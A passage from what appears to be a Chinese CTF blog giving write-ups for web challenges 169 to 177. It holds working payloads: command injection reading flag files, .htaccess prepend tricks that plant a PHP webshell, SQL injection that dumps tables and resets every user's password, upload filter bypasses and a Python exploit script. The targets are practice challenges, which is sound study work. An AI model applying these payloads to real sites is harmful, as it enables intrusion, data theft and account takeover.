class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>绕过hash_hmac，White-cat-monitor传入数组，会返回false，然后<code>$clandestine</code>的值就是false了，我们在本地<code>echo(hash_hmac(&#39;sha256&#39;,&#39;;cat flag.php&#39;,false))</code>就可以模拟出hh的值，然后用POST传<code>Black-Cat-Sheriff</code>为我们模拟的值，One-ear传入命令，读取的是flag.php</p>
<p>payload：</p>
<p><code>Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat flag.php&amp;White-cat-monitor[]=1</code></p>
<h1 id="169-羊城杯-2020-easyphp"><a href="#169-羊城杯-2020-easyphp" class="headerlink" title="169.[羊城杯 2020]easyphp"></a>169.[羊城杯 2020]easyphp</h1><p>BUU做过，关于.htaccess的深入文章：<code>https://blog.csdn.net/LYJ20010728/article/details/116538926</code></p>
<p>用的是用法五第一点的方法，.htaccess文件的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&#x27;cat /f*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure>

<p>第一个\绕过对file的过滤，.htaccess中，\作为连接符连接上下两行。这样，我们所有文件运行前就都会包含.htaccess文件，flag被过滤，使用通配符?来绕过，代码在content后面加了\nHello,world，会让.htaccess文件多出一句Hello,world，会让靶机500。所以在最后面加上\将下一行的hello,world拽上来。payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system(&#x27;cat%20/f*&#x27;)%3B%3F%3E%5C</span><br></pre></td></tr></table></figure>

<p>打了之后访问&#x2F;index.php就能getflag。还有一个解法是用php伪协议，用64加密后传入content，写进.htaccess，先传一个将正则给绕过的.htaccess，也就是第五种用法的第2条，这样waf就会失效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>

<p>php版本&gt;&#x3D;7就要设置第二行。传完之后就可以使用filter协议了，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=convert.base64- decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="170-HUBUCTF-2022-新生赛-ezsql"><a href="#170-HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="170.[HUBUCTF 2022 新生赛]ezsql"></a>170.[HUBUCTF 2022 新生赛]ezsql</h1><p>注册个账号登陆，sqlmap直接跑，能跑出库表字段但是获取不到内容，是要在update.php中手动注入，回显处在description，控制age为payload，通过控制password字段为弱口令，修改所有用户密码，登陆admin可以在description项里发现原密码的md5，解得iamcool，重启靶机直接登陆获取flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">nickname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>age<span class="operator">=</span><span class="number">22</span>,description<span class="operator">=</span>(<span class="keyword">select</span> database())<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>description<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>token<span class="operator">=</span><span class="number">2</span>ae7179fd15fbb5aec663c29df11eef6</span><br><span class="line">#demo2</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">nickname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>age<span class="operator">=</span><span class="number">22</span>,description<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>demo2)<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>description<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>token<span class="operator">=</span><span class="number">2</span>ae7179fd15fbb5aec663c29df11eef6</span><br><span class="line">#users</span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">nickname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>age<span class="operator">=</span><span class="number">22</span>,description<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;0x7573657273&#x27;</span>)<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>description<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>token<span class="operator">=</span><span class="number">2</span>ae7179fd15fbb5aec663c29df11eef6</span><br><span class="line">#hex(<span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">0x7573657273</span>，不然会报错</span><br><span class="line">#id,username,password,nickname,age,description</span><br><span class="line"></span><br><span class="line">payload4:</span><br><span class="line">nickname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>age<span class="operator">=</span><span class="number">22</span>,description<span class="operator">=</span>(<span class="keyword">select</span> group_concat(password) )<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>description<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>token<span class="operator">=</span><span class="number">2</span>ae7179fd15fbb5aec663c29df11eef6</span><br><span class="line">#回显的是md5加密后的注册密码，后面要修改密码</span><br><span class="line"></span><br><span class="line">payload5:</span><br><span class="line">nickname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>age<span class="operator">=</span><span class="number">22</span>,password<span class="operator">=</span><span class="number">0x3230326362393632616335393037356239363462303731353264323334623730</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>description<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>token<span class="operator">=</span><span class="number">2</span>ae7179fd15fbb5aec663c29df11eef6</span><br><span class="line">#把所有用户的密码改成<span class="number">123</span></span><br></pre></td></tr></table></figure>

<h1 id="171-SWPUCTF-2023-秋季新生赛-RCE-PLUS"><a href="#171-SWPUCTF-2023-秋季新生赛-RCE-PLUS" class="headerlink" title="171.[SWPUCTF 2023 秋季新生赛]RCE-PLUS"></a>171.[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);      </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把flag写入到文件</p>
<p><code>?cmd=cat /f*&gt;1.txt</code></p>
<p>再访问1.txt就可以了</p>
<h1 id="172-NUSTCTF-2022-新生赛-ezProtocol"><a href="#172-NUSTCTF-2022-新生赛-ezProtocol" class="headerlink" title="172.[NUSTCTF 2022 新生赛]ezProtocol"></a>172.[NUSTCTF 2022 新生赛]ezProtocol</h1><p>最终请求包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:28409</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dinner=big meal</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: http://localhost/</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 324</span><br><span class="line"></span><br><span class="line">username=admin&amp;p1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;p2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.POST</span><br><span class="line">2.username参数</span><br><span class="line">3.referer</span><br><span class="line">4.xff</span><br><span class="line">5.md5强碰撞</span><br><span class="line">6.cookie</span><br></pre></td></tr></table></figure>

<h1 id="173-SCTF-2021-loginme"><a href="#173-SCTF-2021-loginme" class="headerlink" title="173.[SCTF 2021]loginme"></a>173.[SCTF 2021]loginme</h1><p>新头，本地访问使用X-Real-IP</p>
<p>传<code>age=&#123;&#123;.Password&#125;&#125;</code></p>
<h1 id="174-UUCTF-2022-新生赛-ezsql"><a href="#174-UUCTF-2022-新生赛-ezsql" class="headerlink" title="174.[UUCTF 2022 新生赛]ezsql"></a>174.[UUCTF 2022 新生赛]ezsql</h1><p>–+注释都不行，又有个新的注释– -，总觉得太抽象了 常学常新，也是因为自己没有做过总结</p>
<p>payload还要逆序</p>
<p>password传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">- --)(esabatad,1 tceles noinu )&#x27;1</span><br><span class="line">#UUCTF</span><br><span class="line"></span><br><span class="line">#查表时发现ro会置空，双写绕过</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">- --&#x27;FTCUU&#x27;=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )eman_elbat(tacnoc_puoorrg,1 tceles noinu )&#x27;1</span><br><span class="line">#flag,users</span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">- --&#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )eman_nmuloc(tacnoc_puoorrg,1 tceles noinu )&#x27;1</span><br><span class="line">#UUCTF</span><br><span class="line"></span><br><span class="line">payload4:</span><br><span class="line">- --galf.FTCUU moorrf )FTCUU(tacnoc_puoorrg,1 tceles noinu )&#x27;1</span><br></pre></td></tr></table></figure>

<h1 id="175-NSSCTF-2nd-php签到"><a href="#175-NSSCTF-2nd-php签到" class="headerlink" title="175.[NSSCTF 2nd]php签到"></a>175.[NSSCTF 2nd]php签到</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造个文件上传表单，传文件名的时候用的是<code>1.php/.</code>把<code>/</code>进行url编码绕过waf，然后访问1.php就可以了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node5.anna.nssctf.cn:28194/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--name要根据题目的源码来调节--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="176-NCTF-2018-小绿草之最强大脑"><a href="#176-NCTF-2018-小绿草之最强大脑" class="headerlink" title="176.[NCTF 2018]小绿草之最强大脑"></a>176.[NCTF 2018]小绿草之最强大脑</h1><p>F12有提示，扫目录源码泄露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>])+<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;怎么没算对呢？&quot;);  </span></span><br><span class="line"><span class="string">		window.history.back(-1);  &lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&lt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&gt;<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你算的太慢了少年！&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;tql，算对了！！&quot;);  </span></span><br><span class="line"><span class="string">	     &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用<code>intval()</code>的特性，对超过21位数的操作结果会根据操作系统不同而产生不同的结果，32位系统：2147483647 64位系统：9223372036854775807</p>
<p>由于post后的响应体位置变动，上一个自己写的连续计算的傻瓜脚本是根据位置来提取参数的，所以会用不了，修改调试了很久，还是得掌握写正则来提取数据</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28181/index.php/login&quot;</span></span><br><span class="line">inp = <span class="string">&#x27;9999999999999999999999&#x27;</span></span><br><span class="line">res = r.get(url)</span><br><span class="line"><span class="keyword">while</span>(<span class="string">&#x27;nctf&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text):  </span><br><span class="line">    np = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>)</span><br><span class="line">    num = np.findall(res.text)</span><br><span class="line">    exp=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        exp += i</span><br><span class="line">    exp+= <span class="string">&#x27;+&#x27;</span>+<span class="string">&#x27;9223372036854775807&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br><span class="line">    ans = <span class="built_in">eval</span>(exp)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    data=&#123;<span class="string">&#x27;input&#x27;</span>:inp, <span class="string">&#x27;ans&#x27;</span>:ans&#125;</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res=r.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h1 id="177-TQLCTF-2022-simple-bypass"><a href="#177-TQLCTF-2022-simple-bypass" class="headerlink" title="177.[TQLCTF 2022]simple_bypass"></a>177.[TQLCTF 2022]simple_bypass</h1><p>注册个账号登陆，点到好康的，在加载图片的时候抓包，能够抓到访问图片的请求，修改文件名为index.php能获取到源码</p>
<p><code>payload:/get_pic.php?image=index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td 